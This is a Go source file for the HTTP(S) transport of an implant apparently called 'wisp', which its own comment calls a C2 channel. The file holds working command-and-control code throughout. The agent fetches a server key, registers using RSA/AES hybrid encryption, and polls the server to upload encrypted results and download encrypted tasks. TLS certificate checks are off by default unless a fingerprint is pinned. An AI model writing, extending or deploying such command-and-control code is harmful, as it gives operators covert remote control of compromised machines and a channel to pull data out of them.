package transport

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// HTTPTransport implements the polling-based HTTP(S) C2 channel.
// It mirrors the wire format of TCPTransport (RSA key exchange + AES session
// encryption) but frames the payloads in JSON over HTTP.
type HTTPTransport struct {
	Host      string
	Port      int
	UseTLS    bool
	AgentID   string
	Keys      *protocol.SessionKeys
	RSAPubPEM string

	// Fingerprint optionally pins the server TLS certificate (hex SHA-256).
	Fingerprint string

	client *http.Client
	base   string

	seq uint64 // monotonic checkin counter (replay protection)
}

// fetchServerKey retrieves the RSA public key from the server's /pubkey
// endpoint. Used when the binary has no compiled-in key (CLI/dev mode).
func (t *HTTPTransport) fetchServerKey() error {
	resp, err := t.client.Get(t.base + "/api/v1/pubkey")
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("pubkey endpoint returned %d", resp.StatusCode)
	}
	var out struct {
		PubKey string `json:"pubkey"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return err
	}
	if out.PubKey == "" {
		return fmt.Errorf("server returned an empty public key")
	}
	t.RSAPubPEM = out.PubKey
	return nil
}

type httpRegisterRequest struct {
	Payload string `json:"payload"`
}

type httpRegisterResponse struct {
	Status string `json:"status"`
	Ack    string `json:"ack"`
}

type httpCheckinRequest struct {
	ID   string `json:"id"`
	Seq  uint64 `json:"seq"`
	Data string `json:"data"`
}

type httpCheckinResponse struct {
	Tasks string `json:"tasks"`
}

// NewHTTPTransport creates an HTTP transport from a base URL and public key.
func NewHTTPTransport(host string, port int, useTLS bool, agentID, rsaPubPEM, fingerprint string) *HTTPTransport {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if fingerprint != "" {
		tlsCfg.VerifyPeerCertificate = fingerprintVerifier(fingerprint)
	}
	tr := &http.Transport{TLSClientConfig: tlsCfg}
	return &HTTPTransport{
		Host:        host,
		Port:        port,
		UseTLS:      useTLS,
		AgentID:     agentID,
		RSAPubPEM:   rsaPubPEM,
		Fingerprint: fingerprint,
		client: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
		base: fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(host, fmt.Sprintf("%d", port))),
	}
}

// Register performs the initial agent registration with the server.
func (t *HTTPTransport) Register(regData []byte) error {
	// Agents launched without a compiled-in key (CLI mode) fetch it first.
	if t.RSAPubPEM == "" {
		if err := t.fetchServerKey(); err != nil {
			return fmt.Errorf("fetch server key: %w", err)
		}
	}

	// Generate session keys
	aesKey := make([]byte, 32)
	hmacKey := make([]byte, 32)
	io.ReadFull(rand.Reader, aesKey)
	io.ReadFull(rand.Reader, hmacKey)
	t.Keys = &protocol.SessionKeys{AESKey: aesKey, HMACKey: hmacKey}

	// Hybrid encryption (same as TCP transport)
	keyMaterial := append(aesKey, hmacKey...)
	encryptedKeys, err := protocol.RSAEncrypt([]byte(t.RSAPubPEM), keyMaterial)
	if err != nil {
		return fmt.Errorf("RSA encrypt: %w", err)
	}

	encryptedReg, err := t.Keys.Encrypt(regData)
	if err != nil {
		return fmt.Errorf("encrypt reg data: %w", err)
	}

	// Build payload: [4 bytes key_len][encrypted_keys][encrypted_reg]
	keyLen := uint32(len(encryptedKeys))
	payload := make([]byte, 4+len(encryptedKeys)+len(encryptedReg))
	binary.LittleEndian.PutUint32(payload[0:4], keyLen)
	copy(payload[4:4+keyLen], encryptedKeys)
	copy(payload[4+keyLen:], encryptedReg)

	req := httpRegisterRequest{Payload: base64.StdEncoding.EncodeToString(payload)}
	body, err := json.Marshal(req)
	if err != nil {
		return err
	}

	resp, err := t.client.Post(t.base+"/api/v1/register", "application/json", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("register request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register returned status %d", resp.StatusCode)
	}

	var res httpRegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return fmt.Errorf("decode register response: %w", err)
	}
	if res.Status != "ok" {
		return fmt.Errorf("registration rejected")
	}

	// Verify ACK decrypts (proves the server holds the session keys)
	ackData, err := base64.StdEncoding.DecodeString(res.Ack)
	if err != nil {
		return fmt.Errorf("decode ack: %w", err)
	}
	if _, err := t.Keys.Decrypt(ackData); err != nil {
		return fmt.Errorf("decrypt ack: %w", err)
	}

	return nil
}

// Checkin polls the server for tasks, optionally delivering results.
func (t *HTTPTransport) Checkin(results []byte) ([]byte, error) {
	t.seq++
	req := httpCheckinRequest{ID: t.AgentID, Seq: t.seq}
	if len(results) > 0 {
		encrypted, err := t.Keys.Encrypt(results)
		if err != nil {
			return nil, fmt.Errorf("encrypt results: %w", err)
		}
		req.Data = base64.StdEncoding.EncodeToString(encrypted)
	}

	body, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	resp, err := t.client.Post(t.base+"/api/v1/checkin", "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("checkin request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusUnauthorized {
		// Session unknown (e.g. after a server restart) → re-register
		return nil, ErrReauth
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("checkin returned status %d", resp.StatusCode)
	}

	var res httpCheckinResponse
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return nil, fmt.Errorf("decode checkin response: %w", err)
	}

	tasksData, err := base64.StdEncoding.DecodeString(res.Tasks)
	if err != nil {
		return nil, fmt.Errorf("decode tasks: %w", err)
	}
	return t.Keys.Decrypt(tasksData)
}
